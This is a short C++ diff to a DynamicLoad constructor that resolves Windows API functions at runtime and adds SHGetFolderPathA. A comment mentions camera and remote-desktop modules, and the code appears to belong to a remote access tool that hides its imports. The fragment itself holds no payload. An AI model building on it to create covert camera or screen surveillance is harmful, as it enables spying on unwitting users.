@@ -58,7 +58,7 @@ DynamicLoad::DynamicLoad() {
         this->KERNEL32.pCreatePipe = (st_Kernel32::LPCREATEPIPE)wrapGetProcAddr(this->hKernel32DLL, "CreatePipe");
         this->KERNEL32.pPeekNamedPipe = (st_Kernel32::LPPEEKNAMEDPIPE)wrapGetProcAddr(this->hKernel32DLL, "PeekNamedPipe");
 
-        //Mod Camara
+        //Mod Camara y remote desktop
         this->KERNEL32.pGlobalAlloc = (st_Kernel32::LPGLOBALALLOC)wrapGetProcAddr(this->hKernel32DLL, "GlobalAlloc");
         this->KERNEL32.pGlobalFree = (st_Kernel32::LPGLOBALFREE)wrapGetProcAddr(this->hKernel32DLL, "GlobalFree");
 
@@ -74,6 +74,7 @@ DynamicLoad::DynamicLoad() {
 
     if (this->hShell32DLL) {
         this->SHELL32.pShellExecuteExA = (st_Shell32::LPSHELLEXECUTEEXA)wrapGetProcAddr(this->hShell32DLL, "ShellExecuteExA");
+        this->SHELL32.pSHGetFolderPathA = (st_Shell32::LPSHGETFOLDERPATHA)wrapGetProcAddr(this->hShell32DLL, "SHGetFolderPathA");
     }
 
     if (this->hWtsapi32DLL) {
